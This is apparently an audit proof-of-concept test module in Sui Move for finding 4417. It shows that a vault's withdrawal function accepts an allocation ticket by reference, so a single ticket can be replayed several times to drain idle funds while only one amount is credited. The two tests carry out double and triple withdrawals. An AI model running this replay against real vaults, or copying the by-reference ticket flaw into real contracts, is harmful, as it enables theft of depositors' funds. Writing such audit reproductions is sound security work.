#[test_only]
// PoC for Finding 4417 (C2): vault.move `withdraw_for_allocation` takes its
// `AllocationTicket` by `&` reference, not by value, so the SAME ticket can be
// spent multiple times inside one PTB. Combined with a single valid
// VerifiedAction (consumed once at `begin_allocation`), an attacker who captured
// one agent attestation can withdraw `N * amount` from the vault's idle float
// while only `amount` is ever credited to `total_deployed` — the rest leaves
// with the caller. This test reproduces the bug end-to-end.
module suioverflow::audit_poc_4417_tests;

use sui::{
    clock::{Self, Clock},
    coin,
    test_scenario as ts,
};
use std::unit_test::{assert_eq, destroy};
use suioverflow::{
    agent_registry::{Self, Registry},
    attestation_verifier,
    vault::{Self, Vault},
};

const OWNER: address = @0xCAFE;
const AGENT: address = @0xA6E27;

public struct TUSD has drop {}

const NAVI: vector<u8> = b"navi";
const DIGEST: vector<u8> = b"decision_record_hash";

#[test_only]
fun setup(
    s: &mut ts::Scenario,
    cap_bps: u64,
    max_move: u64,
    daily_loss: u64,
    deposit: u64,
): (Registry, Clock, Vault<TUSD>, agent_registry::AgentCap) {
    agent_registry::init_for_testing(s.ctx());
    s.next_tx(OWNER);
    let mut reg = s.take_shared<Registry>();
    let clk = clock::create_for_testing(s.ctx());
    let cap = agent_registry::register(&mut reg, &clk, AGENT, b"p0", b"p1", b"p2", b"pk", s.ctx());
    let mut v = vault::open<TUSD>(AGENT, cap_bps, max_move, daily_loss, &clk, s.ctx());
    let c = coin::mint_for_testing<TUSD>(deposit, s.ctx());
    vault::deposit(&mut v, c, s.ctx());
    (reg, clk, v, cap)
}

#[test_only]
fun teardown(reg: Registry, clk: Clock, v: Vault<TUSD>, cap: agent_registry::AgentCap) {
    destroy(cap);
    destroy(v);
    destroy(clk);
    ts::return_shared(reg);
}

/// Same VerifiedAction, same ticket, two `withdraw_for_allocation` calls —
/// both succeed (bug), and the second withdraw is "free" money to the caller.
/// idle drops by 2 × amount while only `amount` is ever credited on confirm.
#[test]
fun poc_4417_double_spend_one_ticket() {
    let mut s = ts::begin(OWNER);
    // Fund vault with 1_000; cap 90%, max move 1_000, daily-loss slack.
    let (reg, clk, mut v, cap) = setup(&mut s, 9_000, 1_000_000, 1_000_000, 1_000);

    // ONE captured agent attestation. `begin_allocation` consumes the
    // VerifiedAction hot-potato, but the nonce is NOT recorded anywhere, so
    // this is the only auth gate the attacker has to clear.
    let va = attestation_verifier::new_verified_for_testing(AGENT, DIGEST, 1);
    let ticket = vault::begin_allocation(&mut v, va, NAVI, 500, DIGEST, &clk);

    // First withdraw — legitimate.
    let w1 = vault::withdraw_for_allocation(&mut v, &ticket, s.ctx());
    assert_eq!(w1.value(), 500);

    // Second withdraw on the SAME &ticket — succeeds because the parameter is
    // `&AllocationTicket`, not `AllocationTicket` by value. In a real PTB this
    // is the second programmable command; here it is the same effect.
    let w2 = vault::withdraw_for_allocation(&mut v, &ticket, s.ctx());
    assert_eq!(w2.value(), 500);

    // idle has been debited TWICE for one ticket.
    assert_eq!(vault::idle_value(&v), 0);

    // Confirm credits only `amount` once into total_deployed.
    vault::confirm_allocation(&mut v, ticket, 0, &clk);
    assert_eq!(vault::total_deployed(&v), 500);

    // The attacker holds the second 500 Coin<T> outside the vault — extracted
    // for free using a single captured attestation.
    assert_eq!(w1.value() + w2.value(), 1_000);

    destroy(w1);
    destroy(w2);
    teardown(reg, clk, v, cap);
    s.end();
}

/// Three withdraws on one ticket — proves the bug is unbounded, not just a
/// "twice" edge case.
#[test]
fun poc_4417_unbounded_replay_one_ticket() {
    let mut s = ts::begin(OWNER);
    let (reg, clk, mut v, cap) = setup(&mut s, 9_000, 1_000_000, 1_000_000, 3_000);

    let va = attestation_verifier::new_verified_for_testing(AGENT, DIGEST, 1);
    let ticket = vault::begin_allocation(&mut v, va, NAVI, 1_000, DIGEST, &clk);

    let w1 = vault::withdraw_for_allocation(&mut v, &ticket, s.ctx());
    let w2 = vault::withdraw_for_allocation(&mut v, &ticket, s.ctx());
    let w3 = vault::withdraw_for_allocation(&mut v, &ticket, s.ctx());

    // All three succeed — same &AllocationTicket replayed three times.
    assert_eq!(w1.value(), 1_000);
    assert_eq!(w2.value(), 1_000);
    assert_eq!(w3.value(), 1_000);
    assert_eq!(vault::idle_value(&v), 0);

    // Only one `amount` is ever credited to the deployed ledger.
    vault::confirm_allocation(&mut v, ticket, 0, &clk);
    assert_eq!(vault::total_deployed(&v), 1_000);

    destroy(w1);
    destroy(w2);
    destroy(w3);
    teardown(reg, clk, v, cap);
    s.end();
}
